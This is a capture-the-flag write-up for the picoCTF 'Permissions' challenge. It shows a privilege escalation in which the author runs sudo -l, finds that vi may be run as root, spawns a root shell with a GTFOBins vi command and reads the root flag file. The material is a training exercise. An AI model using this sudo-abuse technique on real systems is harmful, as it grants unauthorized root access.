# Permissions
Challenge Description:
> Can you read files in the root file?

CTF: <b>picoCTF</b> (picoGym)<br>Difficulty: <b>Medium</b>

<b>[Jump to solution](#solution)</b>

## Hints
Here are the hints provided by the challenge author.
<details>
<summary>Hint 1</summary>

> What permissions do you have?
</details>

## Procedure
Every time I get access to a shell and need to escalate privileges, I run `sudo -l` to see what I can run with root privileges.
```
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```
In this case, I can run `vi` as root. Referring to [GTFOBins](https://gtfobins.org/gtfobins/vi/#shell), we can run the following command to get a privileged shell using `vi`:
- `sudo vi -c ':!/bin/sh' /dev/null`
```
picoplayer@challenge:~$ sudo vi -c ':!/bin/sh' /dev/null

# whoami
root
# cat /root/.flag.txt       
hammy{u win - hammy}
```

## Solution
1. Run these commands to spawn a privileged shell and read the flag:
    - `sudo vi -c ':!/bin/sh' /dev/null`
    - `cat /root/.flag.txt`

## Key Takeaways
When needing to escalate privileges in a shell, always run `sudo -l` and then check GTFOBins to see if you can abuse the listed commands, if any.